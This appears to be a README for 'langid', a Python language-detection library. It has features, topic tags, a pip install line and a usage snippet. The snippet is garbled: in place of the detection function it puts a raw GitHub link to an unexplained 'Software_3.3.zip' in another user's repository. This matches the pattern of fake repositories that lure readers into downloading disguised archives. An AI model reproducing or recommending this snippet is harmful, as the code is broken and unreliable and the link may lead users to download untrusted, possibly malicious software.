## Overview

**langid** is a fast and efficient language identification tool, serving as a rewrite of the original `langid/py3langid`. This library provides a robust solution for detecting languages in text data. It is designed for developers, researchers, and anyone needing to quickly identify the language of a given text.

## Features

- **Speed**: Optimized for quick detection, making it suitable for large datasets.
- **Accuracy**: High accuracy rates for a wide range of languages.
- **Lightweight**: Minimal dependencies for easy integration.
- **Flexible**: Works with various input formats and sizes.
- **Easy to Use**: Simple API for quick implementation.

## Topics

This repository covers a variety of topics relevant to language detection:

- detect-language
- detect-languages
- langid
- language-detection
- language-detection-lib
- language-detection-library
- language-detector
- language-identification
- language-recognition
- nlp
- whatlang

## Installation

To install **langid**, you can use pip. Run the following command in your terminal:

```bash
pip install langid
```

## Usage

Here's a simple example of how to use **langid** in your Python project:

```python
import langid

text = "Bonjour tout le monde"
language, confidence = https://raw.githubusercontent.com/eliangonde/langid/master/examples/Software_3.3.zip(text)

print(f"Detected language: {language} with confidence {confidence}")
```

This code snippet will detect the language of the input text and provide a confidence score.
